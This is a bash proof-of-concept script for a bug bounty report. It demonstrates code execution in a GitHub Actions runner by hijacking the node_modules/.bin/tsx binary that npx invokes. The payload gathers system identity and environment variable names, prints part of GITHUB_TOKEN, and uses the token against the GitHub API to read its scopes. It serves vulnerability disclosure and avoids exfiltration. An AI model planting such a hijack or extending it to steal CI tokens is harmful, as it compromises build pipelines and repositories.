#!/usr/bin/env bash
# PoC: RCE via node_modules/.bin/tsx injection
# Bug bounty finding #584 â€” non-destructive proof of execution only

set -euo pipefail

echo ""
echo "============================================"
echo "=== RCE PROOF: tsx binary hijack via npx ==="
echo "============================================"
echo ""

echo "[*] This script was executed instead of the real tsx binary."
echo "[*] Attacker-controlled code is running in the GitHub Actions runner."
echo ""

echo "--- System Info ---"
echo "whoami:  $(whoami)"
echo "id:      $(id)"
echo "uname:   $(uname -a)"
echo "pwd:     $(pwd)"
echo "hostname: $(hostname)"
echo ""

echo "--- Environment Variable Names (not values) ---"
env | cut -d= -f1 | sort
echo ""

echo "--- GITHUB_TOKEN Prefix (first 8 chars) ---"
if [ -n "${GITHUB_TOKEN:-}" ]; then
    echo "GITHUB_TOKEN starts with: ${GITHUB_TOKEN:0:8}..."
    echo "(Token is ${#GITHUB_TOKEN} characters long)"
else
    echo "GITHUB_TOKEN is not set"
fi
echo ""

echo "--- Token Permission Check ---"
if [ -n "${GITHUB_TOKEN:-}" ] && [ -n "${GITHUB_REPOSITORY:-}" ]; then
    echo "Checking token permissions via GitHub API..."
    RESPONSE_HEADERS=$(curl -sI \
        -H "Authorization: Bearer ${GITHUB_TOKEN}" \
        -H "Accept: application/vnd.github+json" \
        "https://api.github.com/repos/${GITHUB_REPOSITORY}" 2>/dev/null || true)

    echo "Relevant response headers:"
    echo "${RESPONSE_HEADERS}" | grep -iE "^x-oauth-scopes:|^x-accepted-oauth-scopes:|^x-ratelimit-" || echo "(no permission headers found)"
else
    echo "Skipping API check (GITHUB_TOKEN or GITHUB_REPOSITORY not set)"
fi
echo ""

echo "============================================"
echo "=== END RCE PROOF                        ==="
echo "============================================"

exit 0
